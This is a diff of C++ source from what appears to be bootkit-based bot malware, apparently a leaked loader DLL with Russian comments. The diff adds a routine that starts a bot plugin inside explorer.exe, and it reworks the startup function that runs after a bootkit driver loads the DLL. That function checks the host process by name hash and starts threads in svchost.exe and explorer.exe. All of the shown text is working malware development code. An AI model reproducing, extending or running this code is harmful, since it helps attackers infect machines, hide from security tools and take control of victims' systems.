@@ -556,9 +556,25 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 	}
 };
 
-void StartBootkitPinger(void* Arguments)
+void ExplorerLoadAndRunBotPlug(void* Arguments)
 {
+	LDRDBG("ExplorerLoadAndRunBotPlug", "started.");
+	DoStartBotDll(NULL, 5000);
+}
+
+void StartBootkitDll(void* Arguments)
+{
+	// If Dll loaded by original Bootkit driver we MUST wait some timeout.
+	// This happens because by default bootkit driver call DllMain(_, DLL_PROCESS_ATTACH, _)
+	// at all.
+	// Waiting helps system to load all libraries in default load order. After loading all modules 
+	// we can apply GetApi for our reasons.
+
 	DWORD timeout = 10 * 1000;
+	
+	LDRDBG("StartBootkitDll", "Sleeping %d ms.", timeout);
+	pSleep(timeout);
+	LDRDBG("StartBootkitDll", "Waking up after %d ms.", timeout);
 
 	// определяем в каком процессе находимся
 	char Name[MAX_PATH];
@@ -568,41 +584,35 @@ void StartBootkitPinger(void* Arguments)
 
 	DWORD Hash = STR::GetHash(ShortName, 0, true);
 
-	// If Dll loaded by original Bootkit driver we MUST wait some timeout.
-	// This happens because by default bootkit driver call DllMain(_, DLL_PROCESS_ATTACH, _)
-	// at all.
-	// Waiting helps system to load all libraries in default load order. After loading all modules 
-	// we can apply GetApi for our reasons.
 
-	LDRDBG("StartBootkitPinger", "LoaderDll loaded in path='%s' pid=%u... Sleeping %d sec.", Name, pGetProcessId(), 
-		timeout);
-	
-	pSleep(timeout);
+	LDRDBG("StartBootkitDll", "LoaderDll loaded in path='%s' pid=%u...", Name, (DWORD)pGetProcessId() );
 
-	LDRDBG("StartBootkitPinger", "LoaderDll wake up and check IsLoadedByOriginalBootkit=%d", IsDllLoadedByBootkitLoader());
+	LDRDBG("StartBootkitDll", "LoaderDll wake up and check IsLoadedByOriginalBootkit=%d", IsDllLoadedByBootkitLoader());
 	if (!IsDllLoadedByBootkitLoader())
 	{
-		LDRDBG("StartBootkitPinger", "LoaderDll is NOT loaded by Bootkit loader. Finished.");
+		LDRDBG("StartBootkitDll", "LoaderDll is NOT loaded by Bootkit loader. Finished.");
 		return;
 	}
 
-	LDRDBG("StartBootkitPinger", "LoaderDll detects original bootkit loading.");
+	LDRDBG("StartBootkitDll", "LoaderDll detects original bootkit loading.");
 	
 	if (Hash == 0x2608DF01 /* svchost.exe */)
 	{
-		LDRDBG("StartBootkitPinger", "LoaderDll loaded in SVCHOST. ");
+		LDRDBG("StartBootkitDll", "LoaderDll loaded in SVCHOST. ");
 		StartThread(DbgRptSvchostThread, NULL);
 	}
 	
 	if (Hash == 0x490A0972 /* explorer.exe */)
 	{
-		LDRDBG("StartBootkitPinger", "LoaderDll loaded in EXPLORER. ");
+		LDRDBG("StartBootkitDll", "LoaderDll loaded in EXPLORER. ");
 		StartThread(DbgRptExplorerThread, NULL);
+		
+		LDRDBG("StartBootkitDll", "Starting loading and run plug.");
+		StartThread(ExplorerLoadAndRunBotPlug, NULL);
 	}
 	
-	LDRDBG("StartBootkitPinger", "finished.");
+	LDRDBG("StartBootkitDll", "finished.");
 }
-
 
 PCHAR GetBootkitSignalFileName()
 {
@@ -752,7 +762,7 @@ DWORD WINAPI LoaderDllMain(HINSTANCE , DWORD reason, LPVOID )
 	LDRDBG("LoaderDllMain", "called with reason=%d", reason);
 	if (reason == DLL_PROCESS_ATTACH)
 	{
-		StartThread(StartBootkitPinger, NULL);
+		StartThread(StartBootkitDll, NULL);
 	}
 
 	// В дропере загрузчик Дллки в память проверяет 
